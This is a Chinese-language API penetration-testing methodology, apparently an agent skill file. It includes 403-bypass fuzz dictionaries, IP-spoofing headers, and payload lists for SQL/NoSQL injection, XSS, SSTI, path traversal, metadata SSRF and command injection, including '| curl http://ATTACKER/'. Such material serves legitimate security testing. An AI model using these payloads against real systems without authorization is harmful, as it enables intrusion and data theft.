# api-fuzz

> 来源: wgpsec/AboutSecurity (web-method) | 融合进 skill-web


# API 安全测试方法论

## ⛔ 深入参考（必读）

- 认证绕过技巧、参数注入、Mass Assignment、请求走私 → [references/api-attack-techniques.md](references/api-attack-techniques.md)
- 403/405 绕过（资源后缀fuzz字典、POST空JSON、Vue Hash路由、前缀发现）→ [references/403-bypass-patterns.md](references/403-bypass-patterns.md)
- 端点语义分析、RESTful CRUD 推断、参数发现、智能 Fuzz、权限边界测试、响应分析 → [references/api-semantic-fuzz.md](references/api-semantic-fuzz.md)
- 按参数语义分类的 Fuzz payload 模板（ID/查询/文件/金额/命令/Header） → [references/api-fuzz-payloads.md](references/api-fuzz-payloads.md)

---

## Phase 1: API 发现与文档

### 端点发现
重点路径：`/api/`, `/v1/`, `/v2/`, `/graphql`, `/rest/`

### 文档泄露（最大信息源）
- `/docs`, `/swagger`, `/swagger-ui`, `/swagger-ui.html`
- `/api-docs`, `/openapi.json`, `/openapi.yaml`

### 框架识别
| 框架 | 特征 | 常见问题 |
|------|------|----------|
| Spring Boot | `/actuator` 端点 | Actuator 信息泄露、SpEL 注入 |
| Express/Koa | `X-Powered-By: Express` | 原型链污染 |
| FastAPI | `/docs` 自动生成 | 默认开启 Swagger |
| Django REST | `/api/?format=json` | 序列化器过度暴露 |
| Laravel | JSON API + PHP | Mass Assignment |

## Phase 2: 认证测试

```
API 端点已确认？
├─ 去掉认证头 → 未认证访问？
├─ IP/路径/方法绕过 → [references/api-attack-techniques.md](references/api-attack-techniques.md)
├─ JWT → 参考 jwt-attack-methodology
└─ OAuth → 参考 oauth-sso-attack
```

## Phase 3: 语义分析与智能 Fuzz

拿到端点列表后，先分析每个端点的**业务含义**，不要盲目跑字典。

### RESTful CRUD 推断

发现 `GET /api/users/123` → 推断 POST(创建)/PUT(修改)/DELETE(删除)/PATCH(Mass Assignment) 端点

### 路径语义→测试方向（关键速查）

| 端点关键词 | 测试方向 |
|-----------|----------|
| `users/{id}`, `order/{id}` | IDOR 遍历 |
| `search`, `query`, `q=` | SQL 注入、XSS |
| `upload`, `import` | 文件上传绕过 |
| `proxy`, `url=`, `redirect` | SSRF、开放重定向 |
| `template`, `render` | SSTI |
| `exec`, `run`, `cmd` | 命令注入 |
| `pay`, `amount`, `price` | 金额篡改（负数/零/极大值） |
| `admin`, `manage`, `config` | 越权访问（最高优先级） |

→ 完整语义分析方法（参数发现、Content-Type 变体、响应分析、IDOR 批量验证、权限边界测试） → [references/api-semantic-fuzz.md](references/api-semantic-fuzz.md)
→ 各类型参数的 Fuzz payload 模板 → [references/api-fuzz-payloads.md](references/api-fuzz-payloads.md)

## Phase 4: 专项测试入口

| 漏洞类型 | 关注点 |
|---------|--------|
| IDOR（越权访问他人数据） | 遍历 ID/UUID、对比不同用户响应 |
| GraphQL 专项 | Introspection/注入/权限绕过 |
| CSRF（跨站诱导执行操作） | Token 验证、SameSite、Referer 检查 |
| CORS（跨域数据读取） | Origin 白名单、凭据模式 |

## Phase 5: 其他测试

### Prototype Pollution / Node.js 特有
- `__proto__` / `constructor.prototype` — 污染 payload
- 利用链：eval、模板注入（SSTI）、服务端 JS 执行

### 请求走私
- [references/api-attack-techniques.md](references/api-attack-techniques.md)

### 路径解析差异
- 前后端不一致或代理层差异可绕过鉴权
- 路径变体：`/api/admin/.`、trailing dot、`/api/admin/..;/public`

## 注意事项
- API 通常用 JSON，设置 `Content-Type: application/json`
- 错误信息比 Web 更详细——重要的信息泄露来源
- API 版本差异（v1 可能有漏洞但 v2 修复了，v1 未下线）
- 先跑语义分析再 fuzz，不要盲目发请求浪费时间
- 管理类端点（`/admin/`, `/manage/`）优先级最高
- 每确认一个漏洞立即 `evidence_save` + `report_vuln`


---

## REF: 403-bypass-patterns

# 403/405 接口绕过模式

当接口返回 403（Forbidden）或 405（Method Not Allowed）时，不要直接跳过——这恰恰说明接口存在且有功能，只是访问控制可能有缺陷。以下技巧源自实战 SRC 案例。

---

## 405 → POST + 空 JSON 体

接口返回 405 Method Not Allowed 时，通常说明 GET 不被允许但其他方法可能可以。关键是不能只改方法——还要带上正确的 Content-Type 和空 JSON body，否则后端可能因格式错误而不返回有效数据：

```bash
# 原始 GET 返回 405
curl -s http://target/api/user/info
# → 405 Method Not Allowed

# 改 POST + 空 JSON（关键是 Content-Type + 空体一起带）
curl -s -X POST http://target/api/user/info \
  -H "Content-Type: application/json" \
  -d '{}'
# → 200 + 返回参数缺失提示（告诉你需要什么参数）

# 根据提示补全参数
curl -s -X POST http://target/api/user/info \
  -H "Content-Type: application/json" \
  -d '{"userId": 1}'
# → 200 + 用户信息
```

为什么有效：很多框架（Spring MVC、Express）对 GET 和 POST 走不同的过滤链，GET 可能被全局 403 规则拦截，但 POST 路径没有对应的拦截规则。

---

## 403 → 资源后缀绕过

利用 Web 服务器/框架对 URL 路径的解析差异。Nginx/Apache 代理层可能根据后缀判断是否为静态资源，对 `.json`、`.css` 等后缀放行而不经过鉴权中间件：

```bash
# 原始接口返回 403
curl -s http://target/api/admin/users
# → 403 Forbidden

# 添加资源文件后缀
curl -s http://target/api/admin/users.json    # 最常见的绕过
curl -s http://target/api/admin/users.css
curl -s http://target/api/admin/users.html
curl -s http://target/api/admin/users.js

# 添加特殊字符
curl -s "http://target/api/admin/users?"
curl -s "http://target/api/admin/users??"
curl -s "http://target/api/admin/users?a.css"
curl -s "http://target/api/admin/users#"
curl -s http://target/api/admin/users/.
curl -s http://target/api/admin/users/./
curl -s http://target/api/admin/users..;/
```

**测试策略**：不要在每个接口上逐一手动测——当发现一个 403 接口时，用下面的字典在**接口末尾**批量 fuzz：

### 403 绕过 Fuzz 字典

```
%09
%20
%23
%2e
%2f
/%2e/
//
/..;/
//..;/
/%20
/%09
/%00
/.json
/.css
/.html
/?
/??
/???
/?testparam
/#
/#test
//.
////
/.//./
~
.
;
..;
;%09
;%09..
;%09..;
;%2f..
*
.json
../
..;/
?a.css
?a.js
?a.jpg
?a.png
../admin
..%2f
./
.%2f
..%00/
..%0d/
..%5c
&
@
?
??
...\
.././
/;/
.%2e/
..\
..%ff/
%2e%2e%2f
%3f
?.css
?.js
%3f.css
%3f.js
%26
%0a
%0d
%0d%0a
%3b
\
.\
```

### 多位置 Fuzz

后缀不只能加在末尾——路径中的每一层目录都可能是绕过点：

```
原始: /api/admin/users
位置1: /api/admin/users.json        ← 末尾
位置2: /api/admin/.json/users       ← 中间层
位置3: /api/.json/admin/users       ← 靠前位置
位置4: /api/admin/users/..;/users   ← 路径回溯
```

### 辅助工具

- **BypassPro** (https://github.com/0x727/BypassPro) — Burp 插件，cli 用不了，自动对 403 接口进行多位置、多后缀 fuzz
- **403bypasser** — 命令行工具，批量测试

---

## 响应字节分析

绕过尝试后，不能只看状态码——更重要的是**响应字节长度**：

| 状态 | 字节变化 | 含义 |
|------|----------|------|
| 403 → 200 | 字节大幅增加 | ✅ 绕过成功，加载了新数据 |
| 403 → 200 | 字节很小（几十字节） | ⚠️ 可能只是空页面/默认页 |
| 200 → 200 | 字节从小变大 | ✅ 不同后缀加载了不同数据 |
| 任何状态 | 字节和正常页面一样 | 未绕过，只是返回了默认页 |

当字节明显变大时，说明加载了新的内容（可能是新的 JS 文件、新的 API 数据），这些新内容中可能包含更多可利用的接口和信息。

---

## Vue/SPA 框架 # Hash 路由

Vue 等前端框架使用 `#` 作为路由标记（如 `https://target/#/login/`）。`#` 后面的内容不会发送到服务器，所以代理工具抓不到前端路由请求。这意味着：

1. 通过 JS 分析（熊猫头/urlfind）找到的接口，前面可能需要加 API 前缀才能直接请求
2. 手动在浏览器中拼接有效接口（如 `https://target/#/admin/dashboard`），如果出现新页面，就会加载新的 JS，从中提取更多接口
3. 用 urlfind 或类似工具扫描时，关注**字节变化**——字节变大说明加载了新数据/新 JS

```bash
# Vue 应用的登录页
https://target/rental/#/login/

# 手动拼接管理接口
https://target/rental/#/admin/dashboard
https://target/rental/#/riskReport?transId=

# 实际 API 请求（需找到正确的前缀）
curl -s http://target/api/gw/rent/rebateBillSettlementList
```

---

## 前置路径发现

同一系统的 API 通常共享相同的前置路径。当在流量中发现一个完整的 API 路径（如 `/api/gw/rent/rebateBillSettlementList`），把这个前置路径（`/api/gw/rent/`）提取出来，和从 JS 中找到的其他短接口名拼接：

```bash
# 流量中捕获到的完整路径
/api/gw/rent/rebateBillSettlementList

# JS 中找到的短接口名
userList
orderDetail
paymentRecord

# 拼接测试
curl -s http://target/api/gw/rent/userList
curl -s http://target/api/gw/rent/orderDetail
curl -s http://target/api/gw/rent/paymentRecord
```

跨站点时同理：如果 A 站和 B 站共用一套后端，A 站发现的接口前缀可以拿到 B 站去尝试。


---

## REF: api-attack-techniques

# API 认证绕过与参数攻击

## 未认证访问
去掉认证头直接请求每个端点：
```
GET /api/users → 401
GET /api/public/users → 200？（绕过）
GET /api/v1/internal/users → 200？（内部端点未保护）
```

## 绕过技巧
```
# IP 白名单绕过
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1

# 路径绕过
/api/admin → 403
/api/Admin → 200？
/api/admin/ → 200？（trailing slash）
/api//admin → 200？（double slash）
/api/admin%20 → 200？（URL编码空格）
/api/admin;.js → 200？（Nginx/Tomcat 解析差异）

# 方法绕过
GET /api/admin → 403
POST /api/admin → 200？
OPTIONS /api/admin → 返回 Allow 头暴露可用方法
```

## 注入测试
```json
// SQL 注入
{"search": "' OR 1=1--"}
{"id": "1 UNION SELECT 1,2,3--"}

// NoSQL 注入（MongoDB）
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "admin.*"}}

// 命令注入
{"filename": "test; cat /etc/passwd"}
```

## 批量赋值（Mass Assignment）
注册/更新时添加额外字段：
```json
{"username": "test", "password": "pass", "role": "admin"}
{"username": "test", "password": "pass", "is_admin": true}
{"username": "test", "password": "pass", "balance": 999999}
```

## 参数类型混淆
```
id=1        → id[]=1（数组）
id=1        → id={"$gt":0}（对象/NoSQL）
limit=10    → limit=999999（大量数据泄露）
page=1      → page=-1（负数）
```


---

## REF: api-fuzz-payloads

# API Fuzz Payload 模板

## 按参数语义选择 Payload

### ID 类参数 (id, uid, user_id, order_id)
```
# IDOR 遍历
1, 2, 3, ..., 100
0, -1, 999999999

# SQL 注入
1 OR 1=1
1' OR '1'='1
1 UNION SELECT 1,2,3--
1; SELECT SLEEP(5)--

# 类型混淆
[1], {"$gt":0}, true, null, ""
```

### 查询类参数 (q, search, query, keyword)
```
# SQL 注入
' OR 1=1--
" OR ""="
' UNION SELECT NULL,NULL,NULL--
1' AND SLEEP(5)--

# XSS
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
{{7*7}}

# SSTI
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
```

### 文件/路径类参数 (file, path, url, filename, dir)
```
# 路径穿越
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd
/etc/passwd%00.jpg

# SSRF
http://127.0.0.1
http://169.254.169.254/latest/meta-data/
http://[::1]/
http://0x7f000001/

# 协议绕过
file:///etc/passwd
dict://127.0.0.1:6379/
gopher://127.0.0.1:6379/_*1%0d%0a
```

### 金额/数量类参数 (amount, price, quantity, balance)
```
# 业务逻辑
0
-1
-99999
0.001
99999999
0.00000001

# 类型混淆
"0"
null
[]
NaN
Infinity
```

### 认证类参数 (token, auth, session, role)
```
# 权限提升
admin
root
1
true
{"role":"admin"}

# 空值绕过
""
null
undefined
0
[]
```

### 命令执行类参数 (cmd, command, exec, host, ip)
```
# 命令注入
; id
| id
`id`
$(id)
; cat /etc/passwd
| curl http://ATTACKER/
`curl http://ATTACKER/`

# 带延时验证
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
```

## 通用 Fuzz 向量（适用于任何参数）

### 边界值
```
""             # 空字符串
" "            # 空格
null           # null 值
[]             # 空数组
{}             # 空对象
0              # 零
-1             # 负数
2147483647     # INT_MAX
9999999999999  # 超大数
true / false   # 布尔值
```

### 特殊字符
```
' " < > \ / ; | & ` $ { } [ ] ( ) # @ ! ~ % ^ *
%00            # Null byte
%0a%0d         # CRLF
\r\n           # 换行
%2e%2e%2f      # URL 编码的 ../
```

## HTTP 方法 Fuzz
```bash
# 对每个端点尝试所有方法
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -X $method "$ENDPOINT")
    echo "$method → $code"
done
```

## Header Fuzz
```bash
# 绕过 IP 白名单
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1

# 绕过路径限制
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
```


---

## REF: api-semantic-fuzz

# API 端点语义分析与智能 Fuzz

与盲目跑字典不同，通过**端点语义**推断参数和业务逻辑，精准构造 payload。

## 目录

1. [RESTful CRUD 推断](#1-restful-crud-推断)
2. [路径语义→参数推断](#2-路径语义参数推断)
3. [命名规律扩展](#3-命名规律扩展)
4. [参数发现](#4-参数发现)
5. [智能 Fuzz 策略](#5-智能-fuzz-策略)
6. [IDOR 批量验证](#6-idor-批量验证)
7. [权限边界测试](#7-权限边界测试)
8. [响应分析](#8-响应分析)

---

## 1. RESTful CRUD 推断

```
发现: GET /api/users/123
推断:
  GET    /api/users          → 列出所有用户（信息泄露）
  GET    /api/users/1        → 遍历用户 ID（IDOR）
  POST   /api/users          → 创建用户（未授权注册）
  PUT    /api/users/123      → 修改用户（越权修改）
  DELETE /api/users/123      → 删除用户（越权删除）
  PATCH  /api/users/123      → 部分更新（Mass Assignment）
```

## 2. 路径语义→参数推断

| 端点模式 | 推断的参数 | 测试方向 |
|----------|-----------|----------|
| `/api/users/{id}` | `id` (int) | IDOR: 遍历 1-1000 |
| `/api/search?q=` | `q` (string) | SQL 注入、XSS |
| `/api/upload` | `file` (multipart) | 文件上传绕过 |
| `/api/export?type=` | `type`, `format` | 路径穿越、SSRF |
| `/api/config` | `key`, `value` | 配置篡改 |
| `/api/execute`, `/api/run` | `cmd`, `command`, `script` | 命令注入 |
| `/api/proxy?url=` | `url`, `target`, `redirect` | SSRF |
| `/api/template`, `/api/render` | `template`, `content` | SSTI |
| `/api/login` | `username`, `password` | 暴力破解、SQL 注入 |
| `/api/reset-password` | `email`, `token`, `code` | 逻辑绕过 |
| `/api/pay`, `/api/order` | `amount`, `price`, `quantity` | 金额篡改 |

## 3. 命名规律扩展

```
发现: /api/v1/user/info
扩展尝试:
  /api/v1/user/list         # 用户列表
  /api/v1/user/detail       # 用户详情
  /api/v1/user/update       # 修改资料
  /api/v1/user/delete       # 删除用户
  /api/v1/admin/user/list   # 管理员接口
  /api/v2/user/info         # 旧版本
  /api/internal/user/info   # 内部接口
```

## 4. 参数发现

### 4.1 常见参数名字典

按业务场景分组：

**身份类**: `id`, `uid`, `user_id`, `userId`, `account`, `username`, `email`, `phone`
**分页类**: `page`, `pageNum`, `pageSize`, `limit`, `offset`, `size`, `start`
**查询类**: `q`, `query`, `search`, `keyword`, `filter`, `sort`, `order`, `orderBy`
**文件类**: `file`, `filename`, `path`, `url`, `filePath`, `dir`, `attachment`
**认证类**: `token`, `auth`, `session`, `key`, `apiKey`, `access_token`, `refresh_token`
**操作类**: `action`, `type`, `method`, `cmd`, `op`, `status`, `role`

### 4.2 参数存在性探测

```bash
# 方法 1: 逐一添加参数观察响应变化
BASE="http://target.com/api/users"
# 基线响应
curl -s "$BASE" | wc -c
# 逐一测试参数
for param in id uid page limit search q role status; do
    len=$(curl -s "$BASE?$param=1" | wc -c)
    echo "$param → $len bytes"
done
# 长度/状态码变化 = 参数被接受
```

```bash
# 方法 2: POST JSON body 参数探测
curl -s -X POST "$BASE" \
  -H "Content-Type: application/json" \
  -d '{"id":1}' | head -5
# 观察报错信息——很多框架会提示缺少哪些参数
# "missing required field: username" → 参数名泄露
```

### 4.3 Content-Type 变体测试

```bash
# 同一端点换不同 Content-Type 可能走不同处理逻辑
curl -X POST "$BASE" -H "Content-Type: application/json" -d '{"id":1}'
curl -X POST "$BASE" -H "Content-Type: application/xml" -d '<id>1</id>'
curl -X POST "$BASE" -H "Content-Type: application/x-www-form-urlencoded" -d 'id=1'
# XML 路径可能有 XXE，form 路径可能有不同的过滤规则
```

## 5. 智能 Fuzz 策略

对每个发现的参数，根据其语义选择 payload：

```
参数名含 id/num → IDOR 遍历 + SQL 注入
参数名含 url/path/file → SSRF + 路径穿越
参数名含 search/q/query → SQL 注入 + XSS
参数名含 template/content → SSTI
参数名含 cmd/exec/run → 命令注入
参数名含 redirect/return/next → 开放重定向
参数名含 amount/price/qty → 业务逻辑（负数、零、极大值）
```

→ 详细 payload 模板 → [api-fuzz-payloads.md](api-fuzz-payloads.md)

## 6. IDOR 批量验证

```bash
# 对数字 ID 端点做快速 IDOR 扫描
for i in $(seq 1 20); do
    resp=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" "$BASE/api/users/$i" -H "Cookie: $COOKIE")
    echo "ID=$i → $resp"
done
# 不同 ID 都返回 200 且内容不同 → IDOR 确认
```

## 7. 权限边界测试

```bash
# 用普通用户 token 访问管理端点
curl -s "$BASE/api/admin/users" -H "Authorization: Bearer $USER_TOKEN"
# 200 → 垂直越权

# 去掉认证头
curl -s "$BASE/api/admin/users"
# 200 → 未授权访问

# 用 A 用户 token 访问 B 用户数据
curl -s "$BASE/api/users/OTHER_USER_ID" -H "Authorization: Bearer $A_TOKEN"
# 返回 B 的数据 → 水平越权
```

## 8. 响应分析

### 关键看点

- **错误信息** → 框架、数据库类型、内部路径泄露
- **多余字段** → API 返回了前端未展示的字段（password_hash、internal_ip、role）
- **调试信息** → `debug=true` 参数可能开启详细错误
- **响应时间差异** → 盲注/盲 SSRF 的判断依据
- **数据量异常** → `limit=-1` 或 `pageSize=99999` 导致全量数据泄露

### 响应模式对照

| 响应 | 含义 | 下一步 |
|------|------|--------|
| `{"error": "missing field: xxx"}` | 参数名泄露 | 补全参数重试 |
| `{"error": "invalid type"}` | 类型信息 | 尝试不同类型 |
| `{"data": [...], "total": 10000}` | 数据量大 | 尝试导出全部 |
| `500 + SQL stack trace` | SQL 注入入口 | → `sql-injection-methodology` |
| `200 但空数组` | 端点存在 | 换参数/方法重试 |
